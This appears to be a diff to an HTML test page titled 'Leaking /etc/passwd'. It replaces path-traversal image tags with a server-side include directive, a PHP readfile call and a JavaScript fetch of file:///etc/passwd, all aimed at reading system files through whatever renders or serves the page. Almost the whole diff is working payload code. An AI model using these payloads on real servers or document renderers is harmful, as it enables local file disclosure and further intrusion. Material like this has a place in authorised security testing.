@@ -7,8 +7,22 @@
     <h1>Leaking /etc/passwd</h1>
     <img src="file:///etc/passwd" height="600" width="600" alt="Leaked /etc/passwd">
 
-    <img src="http://localhost/../../etc/passwd"  height="600" width="600" >
-    <img src="http://localhost/../../../etc/passwd"  height="600" width="600" >
-    <img src="http://localhost/../../../../etc/passwd"  height="600" width="600" >
+    <!--#include file="/etc/passwd" -->
+
+<?php
+echo "<pre>";
+readfile('/etc/passwd');
+echo "</pre>";
+?>
+
+<script>
+    fetch('file:///etc/passwd')
+        .then(response => response.text())
+        .then(data => {
+            document.body.innerHTML = `<pre>${data}</pre>`;
+        });
+</script>
+
+
 </body>
 </html>
